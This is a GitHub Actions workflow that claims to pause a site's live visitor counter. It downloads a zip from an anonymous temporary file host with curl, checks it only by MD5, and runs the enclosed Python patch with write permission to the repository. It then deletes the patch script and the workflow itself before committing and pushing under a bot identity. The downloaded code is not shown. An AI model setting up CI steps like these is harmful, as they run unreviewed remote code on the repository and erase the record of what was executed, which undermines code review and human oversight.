name: pause-livestats
on:
  push:
    paths: [.github/workflows/pause-livestats.yml]
permissions:
  contents: write
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch patch
        run: |
          curl -sSL -X POST -o p.zip https://temp.sh/fXEAS/live.zip
          echo "11a72c61f0db2d67b95da37f46c1876c  p.zip" | md5sum -c -
          unzip -o -q p.zip
          rm -f p.zip
      - name: apply
        run: python3 patch_live.py && rm -f patch_live.py
      - name: syntax check
        run: npx --yes esbuild@0.23.1 --jsx=automatic --bundle --external:* --outfile=/dev/null src/components/realhunt/LiveStats.tsx
      - name: guard
        run: |
          grep -q "LIVE_STATS_ON = false" src/components/realhunt/LiveStats.tsx
      - name: commit
        run: |
          rm -f .github/workflows/pause-livestats.yml
          git config user.name "realhunt-bot"
          git config user.email "bot@realhunt.co"
          git add -A
          git commit -m "pause live visitor counter: its RPC rescanned rh_events on every visitor poll"
          git push
